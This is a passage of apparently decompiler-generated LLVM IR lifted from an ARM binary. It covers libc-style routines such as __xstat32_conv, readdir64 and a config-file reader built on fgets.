  %v3_16668 = add i32 %v0_16660, 92
  %v4_16668 = inttoptr i32 %v3_16668 to i32*
  %v5_16668 = load i32, i32* %v4_16668, align 4
  store i32 %v5_16668, i32* %r1.global-to-local, align 4
  %v1_1666c = add i32 %v0_16660, 64
  store i32 %v1_1666c, i32* %r6.global-to-local, align 4
  %v1_16670 = inttoptr i32 %v1_1666c to i32*
  %v2_16670 = load i32, i32* %v1_16670, align 4
  store i32 %v2_16670, i32* %r6.global-to-local, align 4
  %v3_16670 = add i32 %v0_16660, 68
  %v4_16670 = inttoptr i32 %v3_16670 to i32*
  %v5_16670 = load i32, i32* %v4_16670, align 4
  store i32 %v5_16670, i32* %r7.global-to-local, align 4
  %v0_16674 = load i32, i32* %r5.global-to-local, align 4
  %v1_16674 = add i32 %v0_16674, 88
  store i32 %v1_16674, i32* %r3.global-to-local, align 4
  %v2_16678 = add i32 %v0_16674, 20
  %v3_16678 = inttoptr i32 %v2_16678 to i32*
  store i32 %v3_16664, i32* %v3_16678, align 4
  %v0_1667c = load i32, i32* %ip.global-to-local, align 4
  %v1_1667c = load i32, i32* %r5.global-to-local, align 4
  %v2_1667c = add i32 %v1_1667c, 24
  %v3_1667c = inttoptr i32 %v2_1667c to i32*
  store i32 %v0_1667c, i32* %v3_1667c, align 4
  %v0_16680 = load i32, i32* %lr.global-to-local, align 4
  %v1_16680 = load i32, i32* %r5.global-to-local, align 4
  %v2_16680 = add i32 %v1_16680, 28
  %v3_16680 = inttoptr i32 %v2_16680 to i32*
  store i32 %v0_16680, i32* %v3_16680, align 4
  %v0_16684 = load i32, i32* %r6.global-to-local, align 4
  %v1_16684 = load i32, i32* %r5.global-to-local, align 4
  %v2_16684 = add i32 %v1_16684, 64
  %v3_16684 = inttoptr i32 %v2_16684 to i32*
  store i32 %v0_16684, i32* %v3_16684, align 4
  %v0_16688 = load i32, i32* %r7.global-to-local, align 4
  %v1_16688 = load i32, i32* %r5.global-to-local, align 4
  %v2_16688 = add i32 %v1_16688, 68
  %v3_16688 = inttoptr i32 %v2_16688 to i32*
  store i32 %v0_16688, i32* %v3_16688, align 4
  %v0_1668c = load i32, i32* %r3.global-to-local, align 4
  %v1_1668c = inttoptr i32 %v0_1668c to i32*
  store i32 %v2_16668, i32* %v1_1668c, align 4
  %v3_1668c = add i32 %v0_1668c, 4
  %v4_1668c = inttoptr i32 %v3_1668c to i32*
  %v5_1668c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1668c, i32* %v4_1668c, align 4
  %v2_16690 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_16690, i32* %r4.global-to-local, align 4
  ret i32 %v2_16668

; uselistorder directives
  uselistorder i32 %v0_16660, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_16638, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_16698 = load i32, i32* @r4, align 4
  store i32 %v3_16698, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_166b0 = inttoptr i32 %arg2 to i8*
  %v4_166b0 = call i32 @__GI_memset(i8* %v3_166b0, i32 0, i32 88)
  %v2_166b4 = load i32, i32* %arg1, align 4
  %v3_166b4 = add i32 %tmp, 4
  %v4_166b4 = inttoptr i32 %v3_166b4 to i32*
  %v5_166b4 = load i32, i32* %v4_166b4, align 4
  store i32 %v5_166b4, i32* %r4.global-to-local, align 4
  %v0_166b8 = load i32, i32* %r6.global-to-local, align 4
  %v1_166b8 = inttoptr i32 %v0_166b8 to i32*
  store i32 %v2_166b4, i32* %v1_166b8, align 4
  %v3_166b8 = add i32 %v0_166b8, 4
  %v4_166b8 = inttoptr i32 %v3_166b8 to i32*
  %v5_166b8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_166b8, i32* %v4_166b8, align 4
  %v0_166bc = load i32, i32* %r5.global-to-local, align 4
  %v1_166bc = add i32 %v0_166bc, 32
  %v1_166c0 = inttoptr i32 %v1_166bc to i32*
  %v2_166c0 = load i32, i32* %v1_166c0, align 4
  %v3_166c0 = add i32 %v0_166bc, 36
  %v4_166c0 = inttoptr i32 %v3_166c0 to i32*
  %v5_166c0 = load i32, i32* %v4_166c0, align 4
  store i32 %v5_166c0, i32* %r4.global-to-local, align 4
  %v1_166c4 = add i32 %v0_166bc, 96
  %v2_166c4 = inttoptr i32 %v1_166c4 to i32*
  %v3_166c4 = load i32, i32* %v2_166c4, align 4
  store i32 %v3_166c4, i32* %r2.global-to-local, align 4
  %v1_166c8 = load i32, i32* %r6.global-to-local, align 4
  %v2_166c8 = add i32 %v1_166c8, 32
  %v3_166c8 = inttoptr i32 %v2_166c8 to i32*
  store i32 %v2_166c0, i32* %v3_166c8, align 4
  %v0_166cc = load i32, i32* %r4.global-to-local, align 4
  %v1_166cc = load i32, i32* %r6.global-to-local, align 4
  %v2_166cc = add i32 %v1_166cc, 36
  %v3_166cc = inttoptr i32 %v2_166cc to i32*
  store i32 %v0_166cc, i32* %v3_166cc, align 4
  %v0_166d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_166d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_166d0 = add i32 %v1_166d0, 12
  %v3_166d0 = inttoptr i32 %v2_166d0 to i32*
  store i32 %v0_166d0, i32* %v3_166d0, align 4
  %v0_166d4 = load i32, i32* %r5.global-to-local, align 4
  %v1_166d4 = add i32 %v0_166d4, 48
  %v2_166d4 = inttoptr i32 %v1_166d4 to i32*
  %v3_166d4 = load i32, i32* %v2_166d4, align 4
  %v1_166d8 = add i32 %v0_166d4, 24
  store i32 %v1_166d8, i32* %ip.global-to-local, align 4
  %v1_166dc = inttoptr i32 %v1_166d8 to i32*
  %v2_166dc = load i32, i32* %v1_166dc, align 4
  store i32 %v2_166dc, i32* %ip.global-to-local, align 4
  %v3_166dc = add i32 %v0_166d4, 28
  %v4_166dc = inttoptr i32 %v3_166dc to i32*
  %v5_166dc = load i32, i32* %v4_166dc, align 4
  store i32 %v5_166dc, i32* %lr.global-to-local, align 4
  %v1_166e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_166e0 = add i32 %v1_166e0, 44
  %v3_166e0 = inttoptr i32 %v2_166e0 to i32*
  store i32 %v3_166d4, i32* %v3_166e0, align 4
  %v0_166e4 = load i32, i32* %r5.global-to-local, align 4
  %v1_166e4 = add i32 %v0_166e4, 64
  %v2_166e4 = inttoptr i32 %v1_166e4 to i32*
  %v3_166e4 = load i32, i32* %v2_166e4, align 4
  %v1_166e8 = add i32 %v0_166e4, 56
  %v2_166e8 = inttoptr i32 %v1_166e8 to i32*
  %v3_166e8 = load i32, i32* %v2_166e8, align 4
  store i32 %v3_166e8, i32* %r2.global-to-local, align 4
  %v1_166ec = load i32, i32* %r6.global-to-local, align 4
  %v2_166ec = add i32 %v1_166ec, 52
  %v3_166ec = inttoptr i32 %v2_166ec to i32*
  store i32 %v3_166e4, i32* %v3_166ec, align 4
  %v0_166f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_166f0 = load i32, i32* %r6.global-to-local, align 4
  %v2_166f0 = add i32 %v1_166f0, 48
  %v3_166f0 = inttoptr i32 %v2_166f0 to i32*
  store i32 %v0_166f0, i32* %v3_166f0, align 4
  %v0_166f4 = load i32, i32* %r5.global-to-local, align 4
  %v1_166f4 = add i32 %v0_166f4, 72
  %v1_166f8 = inttoptr i32 %v1_166f4 to i32*
  %v2_166f8 = load i32, i32* %v1_166f8, align 4
  %v3_166f8 = add i32 %v0_166f4, 76
  %v4_166f8 = inttoptr i32 %v3_166f8 to i32*
  %v5_166f8 = load i32, i32* %v4_166f8, align 4
  store i32 %v5_166f8, i32* %r1.global-to-local, align 4
  %v0_166fc = load i32, i32* %r6.global-to-local, align 4
  %v1_166fc = add i32 %v0_166fc, 56
  %v1_16700 = inttoptr i32 %v1_166fc to i32*
  store i32 %v2_166f8, i32* %v1_16700, align 4
  %v3_16700 = add i32 %v0_166fc, 60
  %v4_16700 = inttoptr i32 %v3_16700 to i32*
  %v5_16700 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16700, i32* %v4_16700, align 4
  %v0_16704 = load i32, i32* %r5.global-to-local, align 4
  %v1_16704 = add i32 %v0_16704, 80
  %v1_16708 = inttoptr i32 %v1_16704 to i32*
  %v2_16708 = load i32, i32* %v1_16708, align 4
  %v3_16708 = add i32 %v0_16704, 84
  %v4_16708 = inttoptr i32 %v3_16708 to i32*
  %v5_16708 = load i32, i32* %v4_16708, align 4
  store i32 %v5_16708, i32* %r1.global-to-local, align 4
  %v0_1670c = load i32, i32* %r6.global-to-local, align 4
  %v1_1670c = add i32 %v0_1670c, 64
  %v1_16710 = inttoptr i32 %v1_1670c to i32*
  store i32 %v2_16708, i32* %v1_16710, align 4
  %v3_16710 = add i32 %v0_1670c, 68
  %v4_16710 = inttoptr i32 %v3_16710 to i32*
  %v5_16710 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16710, i32* %v4_16710, align 4
  %v0_16714 = load i32, i32* %r5.global-to-local, align 4
  %v1_16714 = add i32 %v0_16714, 16
  %v2_16714 = inttoptr i32 %v1_16714 to i32*
  %v3_16714 = load i32, i32* %v2_16714, align 4
  %v1_16718 = load i32, i32* %r6.global-to-local, align 4
  %v2_16718 = add i32 %v1_16718, 16
  %v3_16718 = inttoptr i32 %v2_16718 to i32*
  store i32 %v3_16714, i32* %v3_16718, align 4
  %v0_1671c = load i32, i32* %r5.global-to-local, align 4
  %v1_1671c = add i32 %v0_1671c, 88
  %v1_16720 = add i32 %v0_1671c, 20
  %v2_16720 = inttoptr i32 %v1_16720 to i32*
  %v3_16720 = load i32, i32* %v2_16720, align 4
  store i32 %v3_16720, i32* %r2.global-to-local, align 4
  %v1_16724 = inttoptr i32 %v1_1671c to i32*
  %v2_16724 = load i32, i32* %v1_16724, align 4
  %v3_16724 = add i32 %v0_1671c, 92
  %v4_16724 = inttoptr i32 %v3_16724 to i32*
  %v5_16724 = load i32, i32* %v4_16724, align 4
  store i32 %v5_16724, i32* %r1.global-to-local, align 4
  %v0_16728 = load i32, i32* %r6.global-to-local, align 4
  %v1_16728 = add i32 %v0_16728, 72
  %v1_1672c = inttoptr i32 %v1_16728 to i32*
  store i32 %v2_16724, i32* %v1_1672c, align 4
  %v3_1672c = add i32 %v0_16728, 76
  %v4_1672c = inttoptr i32 %v3_1672c to i32*
  %v5_1672c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1672c, i32* %v4_1672c, align 4
  %v0_16730 = load i32, i32* %r2.global-to-local, align 4
  %v1_16730 = load i32, i32* %r6.global-to-local, align 4
  %v2_16730 = add i32 %v1_16730, 20
  %v3_16730 = inttoptr i32 %v2_16730 to i32*
  store i32 %v0_16730, i32* %v3_16730, align 4
  %v0_16734 = load i32, i32* %ip.global-to-local, align 4
  %v1_16734 = load i32, i32* %r6.global-to-local, align 4
  %v2_16734 = add i32 %v1_16734, 24
  %v3_16734 = inttoptr i32 %v2_16734 to i32*
  store i32 %v0_16734, i32* %v3_16734, align 4
  %v0_16738 = load i32, i32* %lr.global-to-local, align 4
  %v1_16738 = load i32, i32* %r6.global-to-local, align 4
  %v2_16738 = add i32 %v1_16738, 28
  %v3_16738 = inttoptr i32 %v2_16738 to i32*
  store i32 %v0_16738, i32* %v3_16738, align 4
  %v2_1673c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1673c, i32* %r4.global-to-local, align 4
  ret i32 %v2_16724

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 96, { 4, 2, 3, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* @r6, align 4
  %v1_16758 = add i32 %tmp, 24
  store i32 %v1_16758, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_16770 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 112) to i32*), align 4
  store i32 %v4_16770, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16770)
  %v0_16784 = load i32, i32* @r6, align 4
  %v2_16784 = add i32 %v0_16784, 16
  %v3_16784 = inttoptr i32 %v2_16784 to i32*
  %v4_16784 = load i32, i32* %v3_16784, align 4
  store i32 %v4_16784, i32* %ip.global-to-local, align 4
  store i32 92048, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_16784)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_16794

dec_label_pc_16794:                               ; preds = %dec_label_pc_167c4, %entry
  %v0_16794 = load i32, i32* @r5, align 4
  %v1_16794 = add i32 %v0_16794, 4
  %v2_16794 = inttoptr i32 %v1_16794 to i32*
  %v3_16794 = load i32, i32* %v2_16794, align 4
  %v4_16794 = add i32 %v0_16794, 8
  %v5_16794 = inttoptr i32 %v4_16794 to i32*
  %v6_16794 = load i32, i32* %v5_16794, align 4
  %tmp10 = icmp ugt i32 %v6_16794, %v3_16794
  br i1 %tmp10, label %dec_label_pc_167c4, label %dec_label_pc_167a0

dec_label_pc_167a0:                               ; preds = %dec_label_pc_16794
  %v1_167a0 = inttoptr i32 %v0_16794 to i32*
  %v2_167a0 = load i32, i32* %v1_167a0, align 4
  %v1_167a4 = add i32 %v0_16794, 12
  %v2_167a4 = inttoptr i32 %v1_167a4 to i32*
  %v3_167a4 = load i32, i32* %v2_167a4, align 4
  %v1_167a8 = add i32 %v0_16794, 20
  %v2_167a8 = inttoptr i32 %v1_167a8 to i32*
  %v3_167a8 = load i32, i32* %v2_167a8, align 4
  %v4_167ac = inttoptr i32 %v3_167a4 to i32*
  %v5_167ac = call i32 @__getdents64(i32 %v2_167a0, i32* %v4_167ac, i32 %v3_167a8, i32 %v6_16794)
  %tmp9 = icmp slt i32 %v5_167ac, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_167bc

.thread:                                          ; preds = %dec_label_pc_167a0
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_167f4

dec_label_pc_167bc:                               ; preds = %dec_label_pc_167a0
  %v1_167bc = load i32, i32* @r5, align 4
  %v2_167bc = add i32 %v1_167bc, 8
  %v3_167bc = inttoptr i32 %v2_167bc to i32*
  store i32 %v5_167ac, i32* %v3_167bc, align 4
  %v0_167c0 = load i32, i32* @r7, align 4
  %v1_167c0 = load i32, i32* @r5, align 4
  %v2_167c0 = add i32 %v1_167c0, 4
  %v3_167c0 = inttoptr i32 %v2_167c0 to i32*
  store i32 %v0_167c0, i32* %v3_167c0, align 4
  %v0_167c4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_167c4

dec_label_pc_167c4:                               ; preds = %dec_label_pc_16794, %dec_label_pc_167bc
  %v1_167e8 = phi i32 [ %v0_16794, %dec_label_pc_16794 ], [ %v0_167c4.pre, %dec_label_pc_167bc ]
  %v1_167c4 = add i32 %v1_167e8, 4
  %v2_167c4 = inttoptr i32 %v1_167c4 to i32*
  %v3_167c4 = load i32, i32* %v2_167c4, align 4
  %v1_167c8 = add i32 %v1_167e8, 12
  %v2_167c8 = inttoptr i32 %v1_167c8 to i32*
  %v3_167c8 = load i32, i32* %v2_167c8, align 4
  %v2_167cc = add i32 %v3_167c8, %v3_167c4
  store i32 %v2_167cc, i32* @r4, align 4
  %v3_167d0 = inttoptr i32 %v2_167cc to i32*
  %v4_167d0 = load i32, i32* %v3_167d0, align 4
  %v1_167d4 = add i32 %v2_167cc, 4
  %v2_167d4 = inttoptr i32 %v1_167d4 to i32*
  %v3_167d4 = load i32, i32* %v2_167d4, align 4
  %v1_167d8 = add i32 %v2_167cc, 16
  %v2_167d8 = inttoptr i32 %v1_167d8 to i16*
  %v3_167d8 = load i16, i16* %v2_167d8, align 2
  %v4_167d8 = zext i16 %v3_167d8 to i32
  %v1_167dc = add i32 %v2_167cc, 8
  %v2_167dc = inttoptr i32 %v1_167dc to i32*
  %v3_167dc = load i32, i32* %v2_167dc, align 4
  store i32 %v3_167dc, i32* %ip.global-to-local, align 4
  %v2_167e0 = add i32 %v4_167d8, %v3_167c4
  %v2_167e4 = or i32 %v3_167d4, %v4_167d0
  %v4_167e4 = icmp eq i32 %v2_167e4, 0
  store i32 %v2_167e0, i32* %v2_167c4, align 4
  %v0_167ec = load i32, i32* %ip.global-to-local, align 4
  %v1_167ec = load i32, i32* @r5, align 4
  %v2_167ec = add i32 %v1_167ec, 16
  %v3_167ec = inttoptr i32 %v2_167ec to i32*
  store i32 %v0_167ec, i32* %v3_167ec, align 4
  br i1 %v4_167e4, label %dec_label_pc_16794, label %dec_label_pc_167f4

dec_label_pc_167f4:                               ; preds = %dec_label_pc_167c4, %.thread
  %v0_16800 = load i32, i32* @r6, align 4
  %v2_16800 = add i32 %v0_16800, 44
  %v3_16800 = inttoptr i32 %v2_16800 to i32*
  %v4_16800 = load i32, i32* %v3_16800, align 4
  store i32 %v4_16800, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16800)
  %v0_1680c = load i32, i32* @r4, align 4
  ret i32 %v0_1680c

; uselistorder directives
  uselistorder i32 %v2_167cc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_167e8, { 1, 0 }
  uselistorder i32 %v6_16794, { 1, 0 }
  uselistorder i32 %v0_16794, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 112, { 1, 2, 3, 0, 4 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 112) to i32*), { 0, 1, 2, 3, 4, 7, 5, 6 }
  uselistorder label %dec_label_pc_167c4, { 1, 0 }
}

define i32 @function_16820(i32 %arg1) local_unnamed_addr {
dec_label_pc_16820:
  %v0_16820 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16820, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_16820
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16820, %bb
  %v4_1682c = phi i32 [ %arg1, %dec_label_pc_16820 ], [ 0, %bb ]
  ret i32 %v4_1682c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_16830 = load i32, i32* @r4, align 4
  %v6_16830 = load i32, i32* @r5, align 4
  %v9_16830 = load i32, i32* @r6, align 4
  %v12_16830 = load i32, i32* @r7, align 4
  %v15_16830 = load i32, i32* @r8, align 4
  %v18_16830 = load i32, i32* @sb, align 4
  %v21_16830 = load i32, i32* @sl, align 4
  %v24_16830 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_16834 = icmp eq i32* %arg1, null
  store i1 %v2_16834, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_16834, label %dec_label_pc_16b44, label %dec_label_pc_1684c

dec_label_pc_1684c:                               ; preds = %entry
  %v1_1684c = urem i32 %arg3, 256
  store i32 %v1_1684c, i32* @sb, align 4
  %v1_16850 = udiv i32 %arg3, 256
  %v3_16854 = urem i32 %v1_16850, 256
  %v3_16858 = mul nuw nsw i32 %v1_1684c, 4
  %v1_16860 = or i32 %v3_16858, 1
  %v1_1686c = and i32 %arg3, 131072
  %v1_16870 = add nsw i32 %v1_1684c, -1
  %v1_1687c = and i32 %arg3, 262144
  store i32 %v1_1687c, i32* %r2.global-to-local, align 4
  %v1_16880 = and i32 %arg3, 65536
  store i32 %v1_16880, i32* %r3.global-to-local, align 4
  store i32 %v1_16880, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_16890 = add i32 %arg4, 1
  store i32 %v1_16890, i32* @sl, align 4
  %v2_16a08 = icmp eq i32 %v1_1686c, 0
  %v1_16a60 = inttoptr i32 %arg2 to i32*
  %v2_16a78 = icmp eq i32 %v1_1687c, 0
  br label %dec_label_pc_16894

dec_label_pc_16894:                               ; preds = %dec_label_pc_16894.backedge, %dec_label_pc_1684c
  %v2_168b0 = phi i32 [ %v0_16894.pre, %dec_label_pc_16894.backedge ], [ %tmp, %dec_label_pc_1684c ]
  %v1_16894 = add i32 %v2_168b0, 4
  %v2_16894 = inttoptr i32 %v1_16894 to i32*
  %v3_16894 = load i32, i32* %v2_16894, align 4
  store i32 %v3_16894, i32* %r3.global-to-local, align 4
  %v2_16898 = icmp eq i32 %v3_16894, 0
  store i1 %v2_16898, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16898, label %dec_label_pc_168a0, label %dec_label_pc_168e8

dec_label_pc_168a0:                               ; preds = %dec_label_pc_16894
  %v1_168a0 = add i32 %v2_168b0, 16
  %v2_168a0 = inttoptr i32 %v1_168a0 to i32*
  %v3_168a0 = load i32, i32* %v2_168a0, align 4
  store i32 %v3_168a0, i32* %r3.global-to-local, align 4
  %v2_168a4 = icmp eq i32 %v3_168a0, 0
  store i1 %v2_168a4, i1* %cpsr_z.global-to-local, align 1
  %v1_168a8 = add i32 %v2_168b0, 8
  %v2_168a8 = inttoptr i32 %v1_168a8 to i32*
  %v3_168a8 = load i32, i32* %v2_168a8, align 4
  store i32 %v3_168a8, i32* %r3.global-to-local, align 4
  br i1 %v2_168a4, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_168a0
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_168a0, align 4
  %v0_168b4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_168a0, %bb
  %v0_168b4 = phi i32 [ %v0_168b4.pre, %bb ], [ %v3_168a8, %dec_label_pc_168a0 ]
  %v2_168b4 = icmp eq i32 %v0_168b4, 0
  store i1 %v2_168b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_168b4, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_16860, i32* %r3.global-to-local, align 4
  %v2_168bc = load i32, i32* @r5, align 4
  %v3_168bc = add i32 %v2_168bc, 8
  %v4_168bc = inttoptr i32 %v3_168bc to i32*
  store i32 %v1_16860, i32* %v4_168bc, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_168c0 = load i32, i32* @r5, align 4
  %v1_168c0 = add i32 %v0_168c0, 16
  %v2_168c0 = inttoptr i32 %v1_168c0 to i32*
  %v3_168c0 = load i32, i32* %v2_168c0, align 4
  store i32 %v3_168c0, i32* %r0.global-to-local, align 4
  %v1_168c4 = add i32 %v0_168c0, 8
  %v2_168c4 = inttoptr i32 %v1_168c4 to i32*
  %v3_168c4 = load i32, i32* %v2_168c4, align 4
  store i32 %v3_168c4, i32* %r3.global-to-local, align 4
  %v2_168c8 = add i32 %v3_168c4, %v3_168c0
  store i32 %v2_168c8, i32* @r0, align 4
  %v0_168cc = call i32 @malloc()
  store i32 %v0_168cc, i32* %r0.global-to-local, align 4
  %v2_168d0 = icmp eq i32 %v0_168cc, 0
  store i1 %v2_168d0, i1* %cpsr_z.global-to-local, align 1
  %v1_168d4 = load i32, i32* @r5, align 4
  %v2_168d4 = add i32 %v1_168d4, 4
  %v3_168d4 = inttoptr i32 %v2_168d4 to i32*
  store i32 %v0_168cc, i32* %v3_168d4, align 4
  br i1 %v2_168d0, label %dec_label_pc_16b44, label %dec_label_pc_168dc

dec_label_pc_168dc:                               ; preds = %.thread
  %v0_168dc = load i32, i32* @r5, align 4
  %v1_168dc = add i32 %v0_168dc, 20
  %v2_168dc = inttoptr i32 %v1_168dc to i32*
  %v3_168dc = load i32, i32* %v2_168dc, align 4
  %v1_168e0 = or i32 %v3_168dc, 1
  store i32 %v1_168e0, i32* %r3.global-to-local, align 4
  store i32 %v1_168e0, i32* %v2_168dc, align 4
  %v0_168e8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_168e8

dec_label_pc_168e8:                               ; preds = %dec_label_pc_16894, %dec_label_pc_168dc
  %v1_168f0 = phi i32 [ %v2_168b0, %dec_label_pc_16894 ], [ %v0_168e8.pre, %dec_label_pc_168dc ]
  %v1_168e8 = add i32 %v1_168f0, 4
  %v2_168e8 = inttoptr i32 %v1_168e8 to i32*
  %v3_168e8 = load i32, i32* %v2_168e8, align 4
  store i32 %v3_168e8, i32* %r2.global-to-local, align 4
  %v4_168e8 = add i32 %v1_168f0, 8
  %v5_168e8 = inttoptr i32 %v4_168e8 to i32*
  %v6_168e8 = load i32, i32* %v5_168e8, align 4
  %v2_168ec = add i32 %v6_168e8, %v3_168e8
  store i32 %v2_168ec, i32* %r3.global-to-local, align 4
  %v2_168f0 = add i32 %v1_168f0, 12
  %v3_168f0 = inttoptr i32 %v2_168f0 to i32*
  store i32 %v2_168ec, i32* %v3_168f0, align 4
  %v0_168f4 = load i32, i32* @fp, align 4
  store i32 %v0_168f4, i32* @r6, align 4
  br label %dec_label_pc_168f8

dec_label_pc_168f8:                               ; preds = %dec_label_pc_16984, %dec_label_pc_16970, %dec_label_pc_168e8
  %v0_16900 = phi i32 [ %v0_168f4, %dec_label_pc_168e8 ], [ %v1_16970, %dec_label_pc_16970 ], [ %v0_16900.pre.pre, %dec_label_pc_16984 ]
  %v0_168f8 = load i32, i32* @r5, align 4
  %v1_168f8 = add i32 %v0_168f8, 12
  store i32 %v1_168f8, i32* %r0.global-to-local, align 4
  %v1_168fc = inttoptr i32 %v1_168f8 to i32*
  %v2_168fc = load i32, i32* %v1_168fc, align 4
  store i32 %v2_168fc, i32* %r0.global-to-local, align 4
  %v3_168fc = add i32 %v0_168f8, 16
  %v4_168fc = inttoptr i32 %v3_168fc to i32*
  %v5_168fc = load i32, i32* %v4_168fc, align 4
  %v2_16900 = add i32 %v2_168fc, %v0_16900
  store i32 %v2_16900, i32* %r0.global-to-local, align 4
  %v2_16904 = sub i32 %v5_168fc, %v0_16900
  %v1_16908 = inttoptr i32 %v0_168f8 to i32*
  %v2_16908 = load i32, i32* %v1_16908, align 4
  store i32 %v2_16908, i32* %r2.global-to-local, align 4
  %v3_1690c = call i32 @fgets(i32 %v2_16900, i32 %v2_16904, i32 %v2_16908)
  store i32 %v3_1690c, i32* %r0.global-to-local, align 4
  store i32 %v3_1690c, i32* %r4.global-to-local, align 4
  %v2_16910 = icmp eq i32 %v3_1690c, 0
  store i1 %v2_16910, i1* %cpsr_z.global-to-local, align 1
  %v0_16918 = load i32, i32* @r5, align 4
  %v1_16918 = add i32 %v0_16918, 12
  br i1 %v2_16910, label %dec_label_pc_16918, label %dec_label_pc_16930

dec_label_pc_16918:                               ; preds = %dec_label_pc_168f8
  store i32 %v1_16918, i32* %r0.global-to-local, align 4
  %v1_1691c = inttoptr i32 %v1_16918 to i32*
  %v2_1691c = load i32, i32* %v1_1691c, align 4
  store i32 %v2_1691c, i32* %r0.global-to-local, align 4
  %v3_1691c = add i32 %v0_16918, 16
  %v4_1691c = inttoptr i32 %v3_1691c to i32*
  %v5_1691c = load i32, i32* %v4_1691c, align 4
  store i32 %v5_1691c, i32* %r2.global-to-local, align 4
  %v3_16924 = inttoptr i32 %v2_1691c to i8*
  %v4_16924 = call i32 @__GI_memset(i8* %v3_16924, i32 0, i32 %v5_1691c)
  store i32 %v4_16924, i32* %r0.global-to-local, align 4
  %v0_16928 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16b48

dec_label_pc_16930:                               ; preds = %dec_label_pc_168f8
  %v2_16930 = inttoptr i32 %v1_16918 to i32*
  %v3_16930 = load i32, i32* %v2_16930, align 4
  store i32 %v3_16930, i32* @r4, align 4
  %v1_16934 = load i32, i32* @r6, align 4
  %v2_16934 = add i32 %v1_16934, %v3_16930
  %v3_16934 = inttoptr i32 %v2_16934 to i8*
  store i32 %v2_16934, i32* %r0.global-to-local, align 4
  %v3_16938 = call i32 @strlen(i8* %v3_16934)
  %v0_16940 = load i32, i32* @r6, align 4
  %v2_16940 = add i32 %v0_16940, %v3_16938
  store i32 %v2_16940, i32* @r6, align 4
  %v0_16944 = load i32, i32* @r4, align 4
